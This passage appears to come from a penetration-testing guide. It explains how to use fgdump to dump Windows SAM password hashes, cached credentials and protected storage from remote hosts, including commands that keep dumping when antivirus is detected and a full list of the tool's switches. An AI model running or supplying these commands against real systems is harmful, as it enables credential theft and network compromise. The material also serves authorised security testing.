Fgdump attempts to access and download the password hashes stored in the SAM. Fgdump can be caught when hosts are running antivirus software, but generally we had success in downloading the hashes. Additionally, fgdump can be run remotely on the network.

To start, you can run the following command to test for the presence of antivirus software without running the hash dump command:

    fgdump -t -h <target host IP address>

The -t command tells the software to test for antivirus while the -h designates the host to attack.  Typically we would use the following command to get the hashes from the host

    fgdump -k -f <local/file/name/and/path>

The -k keeps the dump running even if antivirus software is detected and -f will read a list of hosts from a file on your local host and attempt to execute the dump against all hosts in the file.  Fgdump writes the outputs of the dumps to files that are denoted by host.pwdump in the directory from which fgdump was ran.  Fgdump also has the following switches that can be executed:

    -? displays help
    -c skips the cache dump
    -w skips the password dump
    -s performs the protected storage dump
    -r forgets about existing pwdump/cachedump files. The default behavior is to skip a host if these files already exist.
    -v makes output more verbose. Use twice for greater effect
    -l logs all output to logfile
    -T runs fgdump with the specified number of parallel threads
    -h is the name of the single host to perform the dumps against
    -H reads host:username:password from a line-separated file (per-host cr edentials)
    -o skips pwdump history dumps
    -a will not attempt to detect or stop antivirus, even if it is present
